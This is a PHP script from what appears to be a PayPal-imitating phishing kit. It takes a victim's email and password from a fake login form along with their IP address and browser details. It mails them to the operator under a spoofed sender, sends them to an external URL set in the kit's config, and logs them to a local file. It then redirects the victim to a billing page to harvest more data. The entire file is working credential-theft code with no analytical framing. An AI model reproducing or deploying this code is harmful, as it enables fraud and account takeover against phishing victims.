<?php
  error_reporting(0);
  ob_start();
  session_start();

include '../../antibots.php';
include '../../config.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
$_SESSION['email']  = $_POST['mail'];
$_SESSION['pass']   = $_POST['pass'];
$message = "
_______________________________
\xF0\x9F\x92\x9C ".$_SESSION['email']."
\xF0\x9F\x92\x9C ".$_SESSION['pass']."
_______________________________
\xF0\x9F\x92\x9C IP: " . $_SERVER['REMOTE_ADDR'] . "
\xF0\x9F\x92\x9C User Agent: ".$_SERVER['HTTP_USER_AGENT']."
";
$Subject="  \xF0\x9F\x92\xA4 +1 LOG PPL \xF0\x9F\x92\xA4 "._ip();
$head="From: \xF0\x9F\x8C\x8C ISK 17 \xF0\x9F\x8C\x8C <rez@isk.com>";
mail($my_mail,$Subject,$message,$head);
file_get_contents($urls . urlencode($message));
$fil = fopen('ppl_ayz.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
if($suspicious == "oui"){
header('location:  ../index.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
$_SESSION['step_one']  = true;
}else{
header('location: ../billing.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
$_SESSION['step_one']  = true;
}}
?>

